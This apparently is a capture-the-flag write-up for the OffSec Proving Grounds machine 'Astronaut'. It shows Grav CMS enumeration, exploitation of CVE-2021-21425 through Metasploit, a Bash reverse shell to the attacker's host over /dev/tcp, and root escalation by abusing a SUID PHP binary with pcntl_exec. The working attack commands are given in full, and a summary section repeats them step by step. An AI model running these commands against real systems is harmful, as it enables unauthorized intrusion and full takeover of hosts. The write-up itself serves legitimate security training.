Astronaut — OffSec Proving Grounds Write-up

Overview

Machine: Astronaut
Platform: OffSec Proving Grounds
OS: Linux
Initial Access: Grav CMS — CVE-2021-21425
Initial User: www-data
Privilege Escalation: SUID-enabled PHP 7.4
Final User: root

⸻

Attack Path

Nmap Enumeration
        │
        ▼
HTTP/Apache on Port 80
        │
        ▼
Grav CMS discovered
        │
        ▼
Grav Admin panel discovered
        │
        ▼
CVE-2021-21425
Grav CMS YAML Write Vulnerability
        │
        ▼
Remote Code Execution
        │
        ▼
www-data
        │
        ▼
Unstable Metasploit session
        │
        ▼
Second Reverse Shell → Kali:5555
        │
        ▼
Stable TTY
        │
        ▼
SUID Enumeration
        │
        ▼
/usr/bin/php7.4
        │
        ▼
SUID PHP → EUID 0
        │
        ▼
Root
        │
        ▼
/root/proof.txt

⸻

1. Reconnaissance

I started with a basic Nmap scan to identify open ports and running services.

nmap -sC -sV -oN nmap.txt 192.168.168.12

The important result was an HTTP service running on port 80.

The web server identified itself as Apache running on Ubuntu.

80/tcp open  http    Apache httpd 2.4.41

Since HTTP was available, I proceeded with web enumeration.

⸻

2. Web Enumeration

I opened the website with curl:

curl -i http://192.168.168.12/

The application was accessible through:

/grav-admin/

I queried the directory:

curl -s http://192.168.168.12/grav-admin/

The response contained several indicators that the application was running Grav CMS.

For example:

<title>Home | Grav</title>
<meta name="generator" content="GravCMS" />

There were also references to Grav-specific directories:

/grav-admin/user/themes/quark/
/grav-admin/user/plugins/
/grav-admin/system/assets/

This confirmed that the target was running Grav CMS.

⸻

3. Grav CMS Administration Panel

I checked the login page:

curl -s http://192.168.168.12/grav-admin/login

The response confirmed the Grav login functionality:

<title>Login | Grav</title>

I also checked the /admin path:

curl -s http://192.168.168.12/grav-admin/admin

This returned:

Grav Admin Login

Therefore, the application structure appeared to be:

http://192.168.168.12/grav-admin/
http://192.168.168.12/grav-admin/login
http://192.168.168.12/grav-admin/admin

⸻

4. Attempting to Identify the Grav Version

I initially attempted to extract a version number from the HTML:

curl -s http://192.168.168.12/grav-admin/admin | grep -oE '[0-9]+\.[0-9]+\.[0-9]+'

This produced various numbers from JavaScript and other resources, for example:

13.805.55
11.054.843
5.722.055
...

These were clearly not reliable Grav version numbers.

I also attempted to retrieve composer.json:

curl -i http://192.168.168.12/grav-admin/composer.json

The server returned:

HTTP/1.1 403 Forbidden

Therefore, the version could not be reliably identified from these methods.

At this point, I moved to vulnerability research based on the identified application.

⸻

5. Identifying the Vulnerability

Searching for known Grav CMS vulnerabilities revealed:

CVE-2021-21425 — Grav CMS YAML Write Vulnerability

The vulnerability allows an attacker to write YAML configuration through the Grav administrative functionality and ultimately achieve remote code execution.

I also found the corresponding exploit on Exploit-DB:

https://www.exploit-db.com/exploits/49788

The exploit was also available through Metasploit.

I searched for the CVE:

msfconsole

Then:

search CVE-2021-21425

Metasploit returned:

Matching Modules
================
exploit/linux/http/gravcms_exec

I selected the module:

use exploit/linux/http/gravcms_exec

⸻

6. Configuring the Metasploit Exploit

I first checked the module options:

show options

The important options were:

RHOSTS
RPORT
TARGETURI
LHOST
LPORT

I configured the target:

set RHOSTS 192.168.168.12

My Kali Linux IP address was:

192.168.45.173

Therefore:

set LHOST 192.168.45.173

The default target URI initially did not work.

When I ran the exploit with:

run

Metasploit reported:

The target is not vulnerable

I also tried forcing exploitation:

set ForceExploit true

However, the exploit then failed while attempting to obtain the Grav cookie and CSRF token:

The server sent a response, but cookie and token was not found.

This suggested that the application was not installed at the root web path.

The earlier enumeration had already shown that Grav was installed under:

/grav-admin/

Therefore, I changed the target URI.

set TARGETURI /grav-admin/

I then verified the target:

check

Metasploit returned:

[+] The target appears to be vulnerable.

This was the important breakthrough.

⸻

7. Exploiting CVE-2021-21425

I executed:

run

Metasploit successfully obtained the required session information:

[*] Sending request to the admin path to generate cookie and token
[+] Cookie and CSRF token successfully extracted !

It then used the scheduler functionality:

[*] Implanting payload via scheduler feature
[+] Scheduler successfully created ! Wait up to 93 seconds

The vulnerability was successfully exploited and command execution was achieved as the web server user.

⸻

8. Meterpreter Session Problems

Initially, I attempted to use the default PHP Meterpreter payload.

However, the resulting sessions were unstable.

I repeatedly received messages similar to:

Meterpreter session ... closed.

and:

Failed to load extension: No response was received to the core_loadlib request.

The session would sometimes open and immediately terminate.

For example:

[*] Sending stage (72690 bytes) to 192.168.168.12
[-] Meterpreter session ... is not valid and will be closed

I also tried running the exploit multiple times, but the problem persisted.

Instead of continuing to rely on the unstable Meterpreter session, I decided to establish a second shell directly from the compromised host.

This is an important practical lesson: an unstable Meterpreter session does not necessarily mean that exploitation failed.

The underlying command execution was working.

⸻

9. Obtaining a Second Reverse Shell

I configured a listener on Kali Linux.

nc -lvnp 5555

From the initial shell on the target, I executed a Bash reverse shell back to my Kali machine:

bash -c 'bash -i >& /dev/tcp/192.168.45.173/5555 0>&1'

The connection was received by my listener.

I now had a separate shell:

www-data@gravity:~/html/grav-admin$

I verified the current user:

whoami

Output:

www-data

I then checked the account:

id

Output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

At this point, the initial compromise was complete.

⸻

10. Stabilizing the Shell

The reverse shell was functional, but I wanted a proper interactive TTY.

I used:

script /dev/null -c /bin/bash

Then checked the terminal:

tty

The result was:

/dev/pts/2

I also verified the shell again:

whoami
www-data

And:

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

This gave me a much more usable shell for further enumeration.

⸻

11. Privilege Escalation Enumeration

With a stable shell as www-data, I began looking for privilege escalation vectors.

A standard first check is SUID binaries.

I ran:

find / -perm -4000 -type f 2>/dev/null

The output contained many normal SUID binaries such as:

/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chsh
/usr/bin/chfn

However, one entry immediately stood out:

/usr/bin/php7.4

A PHP interpreter normally should not have the SUID bit set.

⸻

12. Inspecting the SUID PHP Binary

I checked the permissions:

ls -la /usr/bin/php7.4

The result was:

-rwsr-xr-x 1 root root 4786104 Feb 23  2023 /usr/bin/php7.4

The important part is:

-rwsr-xr-x
   ^
   S

The s in the owner’s execute position means that the SUID bit is enabled.

The binary is owned by:

root root

Therefore, when executed, PHP has an effective UID of root.

⸻

13. Verifying the Effective UID

Before attempting privilege escalation, I verified the actual UID values.

I ran:

/usr/bin/php7.4 -r 'echo "UID=".posix_getuid()." EUID=".posix_geteuid()."\n";'

The result was:

UID=33 EUID=0

This was the critical finding.

The real UID was still:

33

which corresponds to:

www-data

But the effective UID was:

0

which corresponds to:

root

This confirmed that the SUID PHP binary was executing with root privileges.

⸻

14. Exploiting SUID PHP

Since PHP was running with an effective UID of root, it could be used to execute commands with elevated privileges.

A simple approach is to invoke Bash with privilege preservation:

/usr/bin/php7.4 -r 'system("/bin/bash -p");'

Depending on the PHP/build/environment, spawning Bash through system() may not preserve the effective privileges as expected.

A cleaner approach is to replace the PHP process directly with Bash using PHP’s process execution functionality:

/usr/bin/php7.4 -r 'pcntl_exec("/bin/bash", ["-p"]);'

After obtaining the shell, I verified the privileges:

whoami

Expected:

root

And:

id

Expected:

uid=0(root) gid=0(root) groups=0(root)

The privilege escalation was successful.

⸻

15. Root Access

I confirmed that the current user was root:

whoami
root

Then:

id
uid=0(root) gid=0(root) groups=0(root)

I moved into the root user’s home directory:

cd /root

and listed the contents:

ls -la

The machine’s root proof was stored in:

/root/proof.txt

I verified access with:

cat /root/proof.txt

The contents of the proof file are intentionally not included in this write-up.

⸻

16. Complete Exploitation Summary

The complete attack chain was:

Step 1 — Discover the web service

nmap -sC -sV 192.168.168.12

Step 2 — Discover Grav CMS

curl -s http://192.168.168.12/grav-admin/

Identify:

GravCMS

Step 3 — Identify the vulnerable version/application

Research:

CVE-2021-21425

Step 4 — Load the Metasploit module

msfconsole
search CVE-2021-21425
use exploit/linux/http/gravcms_exec

Step 5 — Configure the target

set RHOSTS 192.168.168.12
set LHOST 192.168.45.173
set TARGETURI /grav-admin/

Step 6 — Verify the vulnerability

check

Expected:

[+] The target appears to be vulnerable.

Step 7 — Exploit

run

This resulted in command execution as:

www-data

Step 8 — Establish a second reverse shell

On Kali:

nc -lvnp 5555

From the target:

bash -c 'bash -i >& /dev/tcp/192.168.45.173/5555 0>&1'

Step 9 — Stabilize the shell

script /dev/null -c /bin/bash

Verify:

tty
whoami
id

Step 10 — Enumerate SUID binaries

find / -perm -4000 -type f 2>/dev/null

Identify:

/usr/bin/php7.4

Step 11 — Verify SUID PHP

ls -la /usr/bin/php7.4

Result:

-rwsr-xr-x 1 root root ... /usr/bin/php7.4

Step 12 — Confirm EUID 0

/usr/bin/php7.4 -r 'echo "UID=".posix_getuid()." EUID=".posix_geteuid()."\n";'

Result:

UID=33 EUID=0

Step 13 — Obtain root

/usr/bin/php7.4 -r 'pcntl_exec("/bin/bash", ["-p"]);'

Verify:

whoami
id

Result:

root
uid=0(root) gid=0(root) groups=0(root)

Step 14 — Access the root proof

cd /root
cat proof.txt

⸻

17. Lessons Learned

This machine demonstrates several important penetration-testing techniques.

Web enumeration

The application did not immediately expose its exact version, but identifying Grav CMS was enough to begin vulnerability research.

Correct target path matters

The Metasploit module initially failed because it expected Grav at:

/

The actual installation was located at:

/grav-admin/

Changing:

set TARGETURI /grav-admin/

allowed the vulnerability check and exploitation to succeed.

Don’t confuse exploit failure with session failure

The Meterpreter sessions repeatedly died, but the underlying exploit was working.

Instead of repeatedly trying the same unstable payload, I used the obtained command execution to establish another reverse shell.

SUID enumeration is important

The command:

find / -perm -4000 -type f 2>/dev/null

revealed the unusual SUID PHP binary:

/usr/bin/php7.4

UID vs EUID

The following output was the key indicator:

UID=33 EUID=0

The real user was still www-data, but the effective user was root.

That meant the SUID PHP interpreter could be leveraged for privilege escalation.

⸻

Conclusion

Astronaut was compromised through a vulnerable Grav CMS installation.

The initial foothold was obtained by exploiting CVE-2021-21425, resulting in command execution as www-data.

The initial Metasploit Meterpreter sessions were unstable, so I established a second reverse shell on port 5555 and converted it into a usable TTY.

Privilege escalation was then achieved by discovering an incorrectly configured SUID PHP 7.4 binary:

/usr/bin/php7.4

The SUID configuration caused PHP to execute with:

EUID=0

which ultimately allowed a root shell to be obtained.

Final privilege level:

root

Root proof:

/root/proof.txt

Attack chain:

Grav CMS
    ↓
CVE-2021-21425
    ↓
Remote Code Execution
    ↓
www-data
    ↓
Reverse Shell :5555
    ↓
Stable TTY
    ↓
SUID Enumeration
    ↓
SUID PHP 7.4
    ↓
EUID 0
    ↓
root
